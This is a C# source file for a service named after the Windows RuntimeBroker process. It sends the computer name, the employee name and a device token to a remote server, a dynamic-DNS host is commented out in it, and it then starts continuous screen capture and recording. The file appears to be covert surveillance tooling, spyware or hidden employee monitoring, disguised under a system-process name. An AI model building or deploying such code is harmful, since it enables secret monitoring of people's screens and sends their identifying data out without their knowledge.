using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace RuntimeBroker
{
    public class RuntimeBrokerService
    {
        private ScreenRecorder _screenRecorder;
        private ScreenTask _screenTask;

        public RuntimeBrokerService()
        {
            Trace.Listeners.Clear();
            string appLogPath = Path.Combine(AppUtils.GetTempFolder(), $"app_runtimebroker.log");
            TextWriterTraceListener twtl = new TextWriterTraceListener(appLogPath);
            twtl.Name = "TextLogger";
            twtl.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;

            Trace.Listeners.Add(twtl);

            Trace.AutoFlush = true;

            Trace.WriteLine("================");

        }

        public async Task<bool> StartAsync(string[] args)
        {
            try
            {
                _screenTask = new ScreenTask();
                _screenTask.LoadSettings();
            }
            catch (Exception ex)
            {
                Trace.WriteLine(ex.ToString());
            }

            Trace.WriteLine("StartAsync");

            string version = Assembly.GetEntryAssembly().GetName().Version.ToString();

            bool isSuccess = false;
            const int MAX_RETRIES = 5;
            for (int i = 0; i < MAX_RETRIES; i++)
            {
                if (i >= MAX_RETRIES)
                {
                    break;
                }

                try
                {
                    string linkLive = $"http://{_screenTask.CurrentSettings.IP}:{_screenTask.CurrentSettings.Port}/image.png";
                    //string linkLive = "http://soft-up.ddns.net:54368/image.png";

                    var client = new HttpClient();
                    var request = new HttpRequestMessage(HttpMethod.Post, $"{_screenTask.CurrentSettings.CreateComputerHost}?ComputerName={_screenTask.CurrentSettings.ComputerName}&Token={Globals.UUID}&EmployeeName={_screenTask.CurrentSettings.EmployeeName}&Version={version}&LinkLive={linkLive}");
                    request.Headers.Add("accept", "text/plain");
                    var response = await client.SendAsync(request);
                    response.EnsureSuccessStatusCode();
                    string result = await response.Content.ReadAsStringAsync();
                    Trace.WriteLine("Create computer request: " + $"{_screenTask.CurrentSettings.CreateComputerHost}?ComputerName={_screenTask.CurrentSettings.ComputerName}&Token={Globals.UUID}&EmployeeName={_screenTask.CurrentSettings.EmployeeName}");
                    Trace.WriteLine("Create computer result: " + result);
                    if (result.Contains("\"success\":true") || result.Contains("Đã tồn tại"))
                    {
                        Trace.WriteLine("Create device success: " + Globals.UUID);
                        isSuccess = true;
                        break;
                    }
                }
                catch (Exception ex)
                {
                    Trace.WriteLine(ex.ToString());
                    await Task.Delay(3000);
                }
            }

            if (isSuccess)
            {
                _ = Task.Run(() =>
                {
                    _ = _screenTask.StartCaptureScreenAsync();
                });

                _ = Task.Run(async () =>
                {
                    _screenRecorder = new ScreenRecorder(_screenTask.CurrentSettings);
                    await _screenRecorder.RunAsync();
                });
            }

            return isSuccess;

        }
    }
}
